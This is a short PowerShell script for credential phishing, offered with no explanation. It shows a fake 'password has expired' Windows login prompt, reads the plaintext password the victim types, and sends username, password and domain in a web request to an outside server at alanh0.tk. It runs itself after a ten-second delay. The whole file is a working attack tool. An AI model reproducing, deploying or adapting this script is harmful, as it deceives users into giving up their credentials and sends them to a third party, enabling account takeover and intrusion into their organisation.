function Invoke-LoginPrompt {
	$cred = $Host.ui.PromptForCredential("Your password has expired and must be changed.", "Old Password", "$env:userdomain\$env:username","")
	$username = "$env:username"
	$domain = "$env:userdomain"
	$password = $cred.GetNetworkCredential().password
    Invoke-WebRequest -URI http://alanh0.tk/gmail/submit.php?username=$username+$password+$domain

}
Start-Sleep -s 10
Invoke-LoginPrompt